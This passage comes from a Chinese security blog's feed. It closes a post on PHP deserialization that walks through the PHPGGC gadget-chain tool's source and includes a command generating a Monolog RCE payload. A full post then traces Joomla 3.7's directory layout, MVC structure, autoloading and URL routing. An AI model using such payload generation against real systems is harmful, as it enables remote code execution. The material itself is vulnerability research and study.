class="line">        <span class="keyword">if</span>(count($parameters) &lt; <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;help();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $class = array_shift($parameters);</span><br><span class="line">        $gc = <span class="keyword">$this</span>-&gt;get_gadget_chain($class);</span><br><span class="line"></span><br><span class="line">        $parameters = <span class="keyword">$this</span>-&gt;get_type_parameters($gc, $parameters);</span><br><span class="line">        $generated = <span class="keyword">$this</span>-&gt;serialize($gc, $parameters);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span>($generated . <span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>代码很简单，一步一步跟着看，首先<code>parse_cmdline</code>完成了对于所选模块及附加参数的解析。</p><p>接下来<code>array_shift</code>完成的操作就是将我们所选的模块从数组中抛出来。</p><p>举个例子，比如我们输入如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./phpggc monolog/rce1 <span class="string">'phpinfo();'</span></span><br></pre></td></tr></table></figure><p>当前的<code>$class</code>为<code>monolog/rce1</code>，看到接下来进入了<code>get_gadget_chain</code>方法中，带着我们参数跟进去看。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_gadget_chain</span><span class="params">($class)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $full = strtolower(<span class="string">'GadgetChain/'</span> . $class);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($full, array_keys(<span class="keyword">$this</span>-&gt;gadgets)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> PHPGGC\<span class="keyword">Exception</span>(<span class="string">'Unknown gadget chain: '</span> . $class);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;gadgets[$full];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>现在的<code>$full</code>为<code>gadgetchain/monolog/rce1</code>，ok，看一下我们全局存储的具有payload的数组：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14998544938101.jpg" alt=""></p><p>可以很清楚的看到，返回了一个已经实例化完成的<code>GadgetChain\Monolog\RCE1</code>的类。对应的目录则为<code>/gadgetchains/Monolog/RCE/1/chain.php</code></p><p>继续向下，看到将类与参数传入了<code>get_type_parameters</code>，跟进：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">get_type_parameters</span><span class="params">($gc, $parameters)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $arguments = $gc-&gt;parameters;</span><br><span class="line"></span><br><span class="line">        $values = @array_combine($arguments, $parameters);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($values === <span class="keyword">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;o($gc, <span class="number">2</span>);</span><br><span class="line">            $arguments = array_map(<span class="function"><span class="keyword">function</span> <span class="params">($a)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'&lt;'</span> . $a . <span class="string">'&gt;'</span>;</span><br><span class="line">            &#125;, $arguments);</span><br><span class="line">            $message = <span class="string">'Invalid arguments for type "'</span> . $gc-&gt;type . <span class="string">'" '</span> . <span class="string">"\n"</span> .</span><br><span class="line">                       <span class="keyword">$this</span>-&gt;_get_command_line($gc-&gt;get_name(), ...$arguments);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> PHPGGC\<span class="keyword">Exception</span>($message);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $values;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其完成的操作对你想要执行或者写入的代码进行装配，即<code>code</code>标志位与你输入的RCE代码进行键值匹配。若未填写代码，则返回错误，成功则返回相应的数组以便进行payload的序列化。</p><p>看完了这个模块后，再看我们最后的一个模块：将RCE代码进行序列化，完成payload的生成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span><span class="params">($gc, $parameters)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $gc-&gt;load_gadgets();</span><br><span class="line"></span><br><span class="line">        $parameters = $gc-&gt;pre_process($parameters);</span><br><span class="line">        $payload = $gc-&gt;generate($parameters);</span><br><span class="line">        $payload = <span class="keyword">$this</span>-&gt;wrap($payload);</span><br><span class="line"></span><br><span class="line">        $serialized = serialize($payload);</span><br><span class="line"></span><br><span class="line">        $serialized = $gc-&gt;post_process($serialized);</span><br><span class="line">        $serialized = <span class="keyword">$this</span>-&gt;apply_filters($serialized);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $serialized;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="0x07-结语"><a href="#0x07-结语" class="headerlink" title="0x07 结语"></a>0x07 结语</h1><p>关于PHP（反）序列化漏洞的触发和利用所涉及的东西还有很多，本文只是做一个概括性的描述，抛砖引玉，如有不精确的地方，望大家给予更正。</p><h1 id="0x08-参考资料"><a href="#0x08-参考资料" class="headerlink" title="0x08 参考资料"></a>0x08 参考资料</h1><ol><li><a href="https://www.insomniasec.com/downloads/publications/Practical%20PHP%20Object%20Injection.pdf" target="_blank" rel="noopener">Practical PHP Object Injection</a></li><li><a href="http://bobao.360.cn/learning/detail/3020.html" target="_blank" rel="noopener">SugarCRM 6.5.23 - REST PHP Object Injection漏洞分析</a></li><li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7124" target="_blank" rel="noopener">CVE-2016-7124</a></li><li><a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener">PHPGGC</a></li><li><a href="http://lucifaer.com/index.php/archives/17/">关于PHP中的自动加载类</a></li><li><a href="http://t.xiaomiquan.com/zJ6Y7Mf" target="_blank" rel="noopener">Phith0n小密圈的主题</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本篇文章为针对PHP反序列化漏洞的介绍与分析。&lt;br&gt;
    
    </summary>
    
      <category term="安全研究" scheme="https://lucifaer.com/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="PHP" scheme="https://lucifaer.com/tags/PHP/"/>
    
      <category term="安全研究" scheme="https://lucifaer.com/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
  </entry>
  
  <entry>
    <title>Joomla 框架的简单跟进</title>
    <link href="https://lucifaer.com/2017/05/27/Joomla%20%E6%A1%86%E6%9E%B6%E7%9A%84%E7%AE%80%E5%8D%95%E8%B7%9F%E8%BF%9B/"/>
    <id>https://lucifaer.com/2017/05/27/Joomla 框架的简单跟进/</id>
    <published>2017-05-27T02:03:00.000Z</published>
    <updated>2018-11-29T09:47:31.612Z</updated>
    
    <content type="html"><![CDATA[<p>最近爆出的Joomla!3.7.0 Core SQL注入漏洞，在分析的时候难免会接触到一些框架本身调用的问题。本着知根知底的想法，我开始了对Joomla框架的简单跟进。</p><p>PS：本人小菜一个，本篇很大程度上是基于本人对代码的跟踪、总结而写的，可能有很多地方不是很准确，希望大牛们勿喷，多给予一些分享。</p><a id="more"></a><h1 id="0x00-文件目录介绍"><a href="#0x00-文件目录介绍" class="headerlink" title="0x00 文件目录介绍"></a>0x00 文件目录介绍</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># 目录</span><br><span class="line">administrator/   # 管理后台目录</span><br><span class="line">bin/             # 该文件夹存放一些基于Joomla框架开发的一些实用的脚本</span><br><span class="line">cache/           # 文件缓存目录</span><br><span class="line">cli/             # 该文件夹存放一些终端使用的命令，用于操作当前的站点</span><br><span class="line">components/      # Joomla组件目录</span><br><span class="line">images/          # 网站内容使用的媒体文件目录，后台有对此文件夹进行管理的功能</span><br><span class="line">includes/        # 运行Joomla需要包含的基础文件</span><br><span class="line">language/        # 语言目录，多语言的翻译都存放在这里</span><br><span class="line">layouts/         # 应该是控制布局的，没有注意过是哪个版本加上的，也没研究过，等有时间了研究一下再写</span><br><span class="line">libraries/       # Joomla使用的库文件</span><br><span class="line">logs/            # 日志目录，一些异常处理都会存放在这个文件夹里，例如后台登录时输入错误的用户名和密码</span><br><span class="line">media/           # Joomla使用到的媒体文件，主要是页面渲染会用到的，存放的内容跟images目录有区别，而且后台是没有对其进行管理的功能的</span><br><span class="line">modules/         # Joomla模块目录</span><br><span class="line">plugins/         # Joomla插件目录</span><br><span class="line">templates/       # Joomla站点模板目录</span><br><span class="line">tmp/             # 临时目录，如安装组件或模块时残留的解压文件等</span><br><span class="line"> </span><br><span class="line"># 文件</span><br><span class="line">configuration.php   # Joomla配置文件</span><br><span class="line">htaccess.txt        # 帮助我们生成.htaccess</span><br><span class="line">index.php           # Joomla单入口文件</span><br><span class="line">LICENSE.txt         # 不多叙述</span><br><span class="line">README.txt          # 不多叙述</span><br><span class="line">robots.txt          # 搜索引擎爬行使用的文件</span><br><span class="line">web.config.txt      # 据说是IIS使用的文件</span><br></pre></td></tr></table></figure><h1 id="0x01-Joomla的MVC"><a href="#0x01-Joomla的MVC" class="headerlink" title="0x01 Joomla的MVC"></a>0x01 Joomla的MVC</h1><p>在Joomla中并不像国内的一些cms一样，主要功能的实现放在组件中，下面就说一说Joomla中的四个非常重要的东西：组件、模块、控制器、视图。</p><h2 id="1-组件"><a href="#1-组件" class="headerlink" title="1. 组件"></a>1. 组件</h2><p>在Joomla中，组件可以说是最大的功能模块。一个组件分为两部分：前台和后台。后台主要用于对对应内容的管理，前台主要用于前台页面的呈现和响应各种操作。其文件目录分别对应于<code>joomla/administrator/components</code>和<code>joomla/components</code>。组件有自己的命名规则，文件夹名须命名为<code>com_组件名</code>，组件的访问也是单文件入口，入口文件为<code>com_组件名/组件名.php</code>。如<code>components/com_content/content.php</code>。</p><p>以<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">其中`option=com_content&amp;view=article&amp;id=7`，它会先调用`content.php`，再由`router.php`路由到`article`视图，再调用相应的Model层取出ID=7的分类信息，渲染之后呈现在模板中的`jdoc:include type=”component`位置上。</span><br><span class="line"></span><br><span class="line">## 2. 模块</span><br><span class="line"></span><br><span class="line">与组件（Component）不同的是，模块（Module）是不能通过URL直接访问的，而是通过后台对模块的设置，根据菜单ID（URL中的Itemid）来判断当前页面应该加载哪些模块。所以它主要用于显示内容，而一些表单提交后的处理动作一般是放在组件中去处理的。因此，模块通常都是比较简单的程序，文件结构也很清晰易懂，如modules/mod_login模块中的文件结构如下：</span><br></pre></td></tr></table></figure></p><p>mod_login.xml            # 模块配置及安装使用的文件<br>mod_login.php            # 模块入口文件，以mod_模块名.php命名，可以看作Controller层<br>helper.php               # 辅助文件，通常数据操作会放在这里，可以看作Model层<br>tmpl/                    # 模p板文件夹，View层<br>|_ default.php           # 默认模板<br>|_ default_logout.php    # 退出登录模板<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 2.1 模块调用的另外一个参数</span><br><span class="line"></span><br><span class="line">在模板的首页文件中，我们会看到调用模块时有如下代码</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">jdoc:include type=&quot;modules&quot; name=&quot;position-7&quot; style=&quot;well&quot;</span><br></pre></td></tr></table></figure></p><p>这里多了一个style参数，这个其实是一个显示前的预处理动作，在当前模板文件夹中的html/modules.php中定义，打开这个文件我们就能看到有一个modChrome_well的函数，程序不是很复杂，只是在显示前对html做了下预处理。</p><h3 id="2-2-模块的另外一种调用方法"><a href="#2-2-模块的另外一种调用方法" class="headerlink" title="2.2 模块的另外一种调用方法"></a>2.2 模块的另外一种调用方法</h3><p>有时候会需要在程序里调用一个模块来显示，可以用以下程序来调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 该程序会显示所有设置在position位置上的模块，当然也会根据菜单ID来判断是否加载</span></span><br><span class="line">$modules = &amp;amp; JModuleHelper::getModules(<span class="string">'position'</span>);</span><br><span class="line"><span class="keyword">foreach</span>($modules <span class="keyword">as</span> $module)&#123;</span><br><span class="line"><span class="keyword">echo</span> JModuleHelper::renderModule($module, <span class="keyword">array</span>(<span class="string">'style'</span> = <span class="string">'well'</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-模板"><a href="#3-模板" class="headerlink" title="3.模板"></a>3.模板</h2><p> 个人理解，模板就相当于输出的一种格式。也就是在后端已经调用了相关的数据，准备在前端以什么样的格式输出。</p><p> 在Joomla中，一个页面只能有一个主要内容（组件：component），其他均属于模块。如图：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045892298827.jpg" alt=""></p><p>如果从代码来分析的话，打开index.php（组件下的index.php），除了简单的HTML和php外，还可以看到以下几类语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jdoc:<span class="keyword">include</span> type=<span class="string">"head"</span></span><br><span class="line">jdoc:<span class="keyword">include</span> type=<span class="string">"modules"</span> name=<span class="string">"position-1"</span> style=<span class="string">"none"</span></span><br><span class="line">jdoc:<span class="keyword">include</span> type=<span class="string">"message"</span></span><br><span class="line">jdoc:<span class="keyword">include</span> type=<span class="string">"component"</span></span><br></pre></td></tr></table></figure><p>这些是Joomla引入内容的方式，Joomla模板引擎会解析这些语句，抓取对应的内容渲染到模板中，组成一个页面。type指明要包含的内容的类型：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">head        <span class="comment"># 页面头文件（包括css/javascript/meta标签），注意这里不是指网站内容的头部</span></span><br><span class="line">modules     <span class="comment"># 模块</span></span><br><span class="line">message     <span class="comment"># 提示消息</span></span><br><span class="line">component   <span class="comment"># 组件</span></span><br></pre></td></tr></table></figure><p>从代码中也可以看出，页面里只有一个component，同时有许多个modules。事实上message也是一个module，只是是一个比较特殊的module。</p><p>以<code>http://127.0.0.1:9999/index.php?option=com_content&amp;view=article&amp;id=7:article-en-gb&amp;catid=10&amp;lang=en&amp;Itemid=116</code>为例从URL来分析模板内容的话，可以清晰的看出：在Joomla的URL中，重要的信息通常包含两部分：组件信息、菜单ID：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">option=com_content  # 该页面内要使用的组件，后台对应到Components中，文件使用JOOMLAROOT components中的文件</span><br><span class="line">view=article       # 组件内要使用的view</span><br><span class="line">id=7               # view对应的ID</span><br><span class="line">Itemid=116          # 该页面对应的菜单ID</span><br></pre></td></tr></table></figure><p>所以上面URL的意思就是告诉Joomla：当前页面是要显示一个文章分类页面，分类ID是7，对应的菜单ID是116。</p><p>最后附一张图，帮助理解：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045892469548.jpg" alt=""></p><h1 id="0x02-整体大致运行流程"><a href="#0x02-整体大致运行流程" class="headerlink" title="0x02 整体大致运行流程"></a>0x02 整体大致运行流程</h1><h2 id="1-框架核心代码的初始化"><a href="#1-框架核心代码的初始化" class="headerlink" title="1. 框架核心代码的初始化"></a>1. 框架核心代码的初始化</h2><ul><li><code>/includes/defines.php</code>定义各个功能模块的目录</li><li><p><code>/includes/framework.php</code>整个框架调度的核心代码与cms运行的核心代码，框架初始化的入口。</p><ul><li><p><code>/libraries/import.legacy.php</code>开启自动加载类，并向注册队列注册cms核心类。</p><p>  调用了<code>JLoader</code>中的setup方法；<code>spl_autoload_register</code>使其进行类的初始定义。</p><blockquote><p><code>spl_autoload_register()</code>是PHP自带的系统函数，其主要完成的功能就是注册给定的函数作为<code>__autoload</code>的实现。即将函数注册到<code>SPL__autoload</code>函数队列中。如果该队列尚未激活，则激活它们。</p></blockquote><ul><li><code>/libraries/loader.php</code>定义了<code>JLoader</code>实现类的注册，加载，相关文件的包含等操作。</li><li>其中<code>load</code>方法从注册队列中寻找需要被自动加载的类，并包含该注册队列的值。</li><li><code>_autoload</code>方法从注册队列中的<code>prefixes</code>的<code>J</code>中选取需要加载的类目录的前缀。<code>[0]=&gt;/joomla/libraries/joomla</code>，<code>[1]=&gt;/joomla/libraries/legacy</code></li><li><code>_load</code>方法完成了绝对路径的拼接，及相关文件的包含</li></ul></li><li><p><code>/cms.php</code>将<code>PHP Composer</code>生成的加载器<code>autoload_static.php</code>、<code>/autoload_namespaces.php</code>、<code>/autoload_psr4.php</code>、<code>/autoload_classmap.php</code>中的内容全部导入一个<code>$loader</code>的数组，之后将该数组中的前缀及所有类，注册到注册队列中，以方便使用。而这些类，都是针对于cms本身的操作的。接着开始设置异常处理以及一个消息处理器（日志）。最后，将一些注册类的名字规范为<code>autoloader</code>的规则。</p></li><li><p><code>configuration.php</code>配置项</p></li><li><p>之后设置报错的格式</p><p>  最终的注册队列：</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045892657574.png" alt=""></p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045892765399.png" alt=""></p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045892951347.png" alt=""></p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045893053364.png" alt=""></p></li></ul></li></ul><h2 id="2-设置分析器，记下使用方法并在分析器后加标记对应代码"><a href="#2-设置分析器，记下使用方法并在分析器后加标记对应代码" class="headerlink" title="2. 设置分析器，记下使用方法并在分析器后加标记对应代码"></a>2. 设置分析器，记下使用方法并在分析器后加标记对应代码</h2><p>对应代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JDEBUG ? JProfiler::getInstance(<span class="string">'Application'</span>)-&gt;setStart($startTime, $startMem)-&gt;mark(<span class="string">'afterLoad'</span>) : <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure><h2 id="3-实例化应用程序"><a href="#3-实例化应用程序" class="headerlink" title="3. 实例化应用程序"></a>3. 实例化应用程序</h2><p>对应代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$app = JFactory::getApplication(<span class="string">'site'</span>);</span><br></pre></td></tr></table></figure><p>在这边可能会有疑问，为什么会直接实例化一个之前没有引入的类（同样也没有包含相应的文件）。</p><p>还记得我们之前看到过的自动加载类么，在这里，我们首先发现没有在<code>classmap</code>中寻找到，之后在<code>/libraries</code>目录，以<code>/libraries/cms/</code>目录为查找目录，在该目录查找是否存在<code>factory.php</code>文件，若找到，则将该文件包含进来。</p><p>在<code>factory.php</code>中，会首先检查我们是否已经创建了一个<code>JApplicationCms</code>对象，如果未创建该对象，则创建该对象。最后创建为<code>JApplicationSite</code>，并将这个对象实例化（对象位于<code>/libraries/cms/application/site.php</code>）。</p><p>在该文件中，首先注册了<code>application</code>（这边是site）的名称与ID，之后执行父构造函数和“祖父“构造函数。</p><p>为了清晰的说明Joomla web应用的实例化过程，我们列一个树状图来看</p><p>|-web.php   “祖父”<br>|–cms.php  父<br>|—site.php    子 </p><blockquote><p>web.php<br>完成了应用的最基础功能，包括：</p><ol><li>返回对全局JApplicationWeb对象的引用，仅在不存在的情况下创建它</li><li>初始化应用程序</li><li>运行应用程序</li><li>对模板的渲染（文档缓冲区推入模板的过程占位符，从文档中检索数据并将其推入应用程序响应缓冲区。）</li><li>检查浏览器的接受编码，并尽可能的将发送给客户端的数据进行压缩。</li><li>将应用程序响应发送给客户端</li><li>URL的重定向</li><li>应用程序配置对象的加载</li><li>设置/获取响应的可缓存状态</li><li>设置响应头的获取、发送与设置等基本功能</li></ol></blockquote><p>首先在<code>web.php</code>中实例化了<code>JInput</code>对象。并将config指向<code>Joomla\Registry\Registry</code>。接着，创建了一个应用程序程序的网络客户端，用于进行网络请求的操作。同时将已经指向的config导入，设置执行时间，初始化请求对象，并配置系统的URIs。</p><p>在<code>cms.php</code>中实例化了调度器，主要完成对于组件及模块的调度。并对session进行设置和初始化。</p><p>完成了以上所有的配置后，将已经配置完毕的应用对象返回到<code>/joomla/libraries/joomla/factory.php</code>中。完成应用对象的初始化。</p><h2 id="4-执行应用"><a href="#4-执行应用" class="headerlink" title="4. 执行应用"></a>4. 执行应用</h2><p>调用web.php中的<code>execute()</code>方法完成应用的执行。</p><h1 id="0x03-说一下我们的关心的路由问题"><a href="#0x03-说一下我们的关心的路由问题" class="headerlink" title="0x03 说一下我们的关心的路由问题"></a>0x03 说一下我们的关心的路由问题</h1><p>那么，我们的路由在框架中到底是怎样解析的呢？</p><p>其实在跟实例化应用的时候，当执行<code>/joomla/libraries/joomla/application/web.php</code>构造函数时，我们就可以看到Joomla对于URI的处理了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;loadSystemUris();</span><br></pre></td></tr></table></figure><p>跟进看一下<code>loadSystemUris</code>方法，不难看到这一句：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045893232898.png" alt=""></p><p>跟进<code>detectRequestUri</code>，发现首先判断了URI是否是http还是https，之后看到这句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_SERVER[<span class="string">'PHP_SELF'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_SERVER[<span class="string">'REQUEST_URI'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// The URI is built from the HTTP_HOST and REQUEST_URI environment variables in an Apache environment.</span></span><br><span class="line">$uri = $scheme . $_SERVER[<span class="string">'HTTP_HOST'</span>] . $_SERVER[<span class="string">'REQUEST_URI'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是在这里将<code>$_SERVER[&#39;REQUEST_URI&#39;]</code>中的相对路径与<code>$scheme . $_SERVER[&#39;HTTP_HOST&#39;]</code>拼接成了完整的URI：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045893426980.png" alt=""><br><img src="http://139.129.31.35/usr/uploads/2017/05/475182260.png" alt="ur"></p><p>完成了完整路径获取后，开始修改对象的属性，将新获得的request.uri添加进入配置列表中：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045893504687.png" alt=""><br><img src="http://139.129.31.35/usr/uploads/2017/05/1509964390.png" alt="ur"></p><p>下一步，就是遍历配置列表，查看是否已经设置了显示URI，在配置列表中键值为<code>site_uri</code>。显然我们现在并没有设置该选项：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045893579514.png" alt=""></p><p>之后完成的操作就是要设置该显示URI。我们继续跟进一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045893734916.png" alt=""></p><p>跟进到<code>joomla/libraries/vendor/joomla/uri/src/UriHelper.php</code>的时候，我们稍停一下，看到进入了<code>parse_url</code>方法中。在这个方法中，首先对传入的URL进行了双重过滤，之后利用PHP自带方法<code>parse_url</code>，对URL进行了分割处理并保存到一个数组中，接着返回该数组：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045893830962.png" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045893931299.png" alt=""></p><p>最后的处理结果为：</p><p><code>option=com_content&amp;view=article&amp;id=7:article-en-gb&amp;catid=10&amp;lang=en&amp;Itemid=116</code></p><p>处理完我们的显示URL后，在调用<code>joomla/libraries/cms/application/cms.php</code>中的<code>execute</code>方法时，在调用<code>doExecute</code>方法的时候，会使用<code>joomla/libraries/cms/application/site.php</code>文件中的<code>route</code>方法，这个方法将路由到我们application中。</p><p>在<code>joomla/libraries/cms/application/cms.php</code>中的<code>route</code>方法中，我们首先获取了全部的request URI，之后在<code>getRouter</code>方法中初始化并实例化了<code>joomla/libraries/cms/router/router.php</code>中的<code>JRouter</code>类，该类完成了对我们路由参数的识别与划分：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045894036447.png" alt=""></p><p>最后在<code>joomla/libraries/cms/router/site.php</code>中的<code>parse</code>方法中完成了相关组件的路由：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045894146895.png" alt=""></p><p>可以明显的看到，在</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$component = <span class="keyword">$this</span>-&gt;JComponentHelper::getComponents()</span><br></pre></td></tr></table></figure><p>后，<code>$component</code>的值：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045894256014.jpg" alt=""></p><p>对比<code>components/</code>目录下的组件，发现已经将所有的组件遍历，并保存在数组中。</p><p>接着遍历该数组，对每个组件设置本地路由，并包含响应的文件，从而完成路由控制。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045894330060.png" alt=""></p><h1 id="0x04-总结一下"><a href="#0x04-总结一下" class="headerlink" title="0x04 总结一下"></a>0x04 总结一下</h1><p>Joomla整体的运行思路可以简单的归结为一下几点：</p><ol><li><p>框架核心代码的初始化：</p><p> 关键是初始化了类自动加载器与消息处理器，并完成了配置文件的配置与导入。<br> 完成了这一步，就可以通过类的自动加载器来实现核心类的查找与调用。自动加载器成为了cms的一个工具。</p></li><li><p>实例化应用程序：</p><p> 这一步可以简单的理解为对Joomla接下来要提供的web服务的预加，与定义。</p></li><li><p>应用的执行：</p><p> 这一步基于上面两步的准备，将执行应用。从代码上来看可以容易的总结出来一个规律：</p><ul><li>预加载“执行之前需要做的事件”</li><li>执行应用</li><li><p>执行“执行之后要做的事件”</p><p>基本上都是以这样的形式来完成调用以及运行的。</p></li></ul></li></ol><p>以上都是小菜个人看法，可能有不准确或者非常模糊的地方，希望大牛们多给建议…<br>QAQ…</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近爆出的Joomla!3.7.0 Core SQL注入漏洞，在分析的时候难免会接触到一些框架本身调用的问题。本着知根知底的想法，我开始了对Joomla框架的简单跟进。&lt;/p&gt;
&lt;p&gt;PS：本人小菜一个，本篇很大程度上是基于本人对代码的跟踪、总结而写的，可能有很多地方不是很准确，希望大牛们勿喷，多给予一些分享。&lt;/p&gt;
    
    </summary>
    
      <category term="安全研究" scheme="https://lucifaer.com/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="安全研究" scheme="https://lucifaer.com/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
      <category term="Joomla" scheme="https://lucifaer.com/tags/Joomla/"/>
    
  </entry>
  
  <entry>
    <title>五指CMS任意文件下载漏洞</title>
    <link href="https://lucifaer.com/2017/05/09/%E4%BA%94%E6%8C%87CMS%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"/>
    <id>https://lucifaer.com/2017/05/09/五指CMS任意文件下载漏洞/</id>
